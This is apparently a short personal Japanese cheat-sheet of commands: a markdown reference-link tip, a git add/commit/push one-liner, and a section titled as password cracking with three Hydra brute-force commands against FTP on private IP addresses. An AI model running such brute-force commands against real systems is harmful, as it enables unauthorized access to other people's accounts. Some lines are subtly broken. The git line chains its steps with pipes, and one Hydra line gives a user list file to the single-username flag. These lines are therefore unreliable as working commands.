# 技術・コマンドとりあえず張る

## markdown

### URLリンク整理
以下のようにすれば読みやすくなる
```
[リンク先][1]
[1]:http://～～～
```

## git
### add commit push
```
git add * | git commit . -m "update" | git push origin main
```

## Hydra
パスワードクラック
```
hydra -L user.lst -P pass.lst -t 8 10.0.0.5 ftp
hydra -l userlist.txt -P passwordlist.txt 192.168.0.107 ftp
hydra -l ftpuser -P passwordlist.txt 192.168.0.107 ftp
```

[return](../README.md)